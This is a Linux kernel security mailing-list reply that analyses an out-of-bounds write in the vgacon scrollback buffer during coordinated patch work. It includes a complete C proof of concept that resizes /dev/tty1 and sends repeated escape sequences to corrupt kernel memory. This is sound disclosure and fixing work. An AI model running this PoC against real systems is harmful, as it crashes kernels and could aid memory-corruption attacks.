From: Jiri Slaby <jirislaby@kernel.org>
Date: Wed, 29 Jul 2020 11:20:00 +0000
Subject: Re: [PATCH] vgacon: fix out of bounds write to the scrollback buffer
Message-Id: <d0cc1f99-1ef0-c7a2-6b42-d25d8fa49f1e@kernel.org>
List-Id: <linux-fbdev.vger.kernel.org>
References: <c1f267aa-dfb3-91fa-3111-30c1676f1a91@kernel.org>
 <c5a73038-f441-602b-584b-3d84622b1fb1@nsfocus.com>
In-Reply-To: <c5a73038-f441-602b-584b-3d84622b1fb1@nsfocus.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit
To: =?UTF-8?B?5byg5LqR5rW3?= <zhangyunhai@nsfocus.com>, b.zolnierkie@samsung.com
Cc: Security Officers <security@kernel.org>, Kyungtae Kim <kt0755@gmail.com>, Anthony Liguori <aliguori@amazon.com>, Greg KH <greg@kroah.com>, linux-kernel@vger.kernel.org, dri-devel@lists.freedesktop.org, linux-fbdev@vger.kernel.org, linux-distros@vs.openwall.org, Solar Designer <solar@openwall.com>, Yang Yingliang <yangyingliang@huawei.com>, Linus Torvalds <torvalds@linux-foundation.org>, "Srivatsa S. Bhat" <srivatsa@csail.mit.edu>

On 29. 07. 20, 10:19, 张云海 wrote:
> On 2020/7/29 16:11, Jiri Slaby wrote:
>> But the loop checks for the overflow:
>>   if (vgacon_scrollback_cur->tail >= vgacon_scrollback_cur->size)
>>         vgacon_scrollback_cur->tail = 0;
>>
>> So the first 2 iterations would write to the end of the buffer and this
>> 3rd one should have zeroed ->tail.
> 
> In the 2nd  iteration before the check:
> vgacon_scrollback_cur->tail is 65360 which is still less then
> vgacon_scrollback_cur->size(65440), so the ->tail won't be zeroed.
> 
> Then it gose to the 3rd  iteration, overflow occurs.

Ahh, I see now! So it must be triggered by CSI M instead. It allows for
more than 1 in count. So this is PoC for this case:
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main(int argc, char** argv)
{
        int fd = open("/dev/tty1", O_RDWR);
        unsigned short size[3] = {25, 200, 0};
        ioctl(fd, 0x5609, size); // VT_RESIZE

        write(fd, "\e[1;1H", 6);
        for (int i = 0; i < 30; i++)
                write(fd, "\e[10M", 5);
}

It corrupts memory, so it crashes the kernel randomly. Even with my
before-loop patch.

So now: could you resend your patch with improved commit message, add
all those Ccs etc.? You can copy most of the Ccs from my patch verbatim.

I am also not sure the test I was pointing out on the top of this
message would be of any use after the change. But maybe leave the code
rest in peace.

thanks,
-- 
js
suse labs
